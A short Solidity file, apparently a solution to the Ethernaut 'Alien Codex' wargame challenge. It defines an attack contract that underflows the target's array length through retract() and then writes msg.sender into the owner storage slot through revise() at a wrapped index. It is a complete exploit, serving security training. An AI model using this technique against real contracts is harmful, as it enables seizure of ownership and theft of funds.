// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IAlienCodex {
    function owner() external returns (address);

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

    function make_contact() external;
}

contract AlienCodexChallenge {
    function attack(address _alienCodex) external {
        IAlienCodex alienCodex = IAlienCodex(_alienCodex);
        alienCodex.make_contact();
        alienCodex.retract();
        unchecked {
            alienCodex.revise(
                type(uint256).max +
                    1 -
                    uint256(keccak256(abi.encodePacked(uint256(1)))),
                bytes32(uint256(uint160(msg.sender)))
            );
        }
    }
}
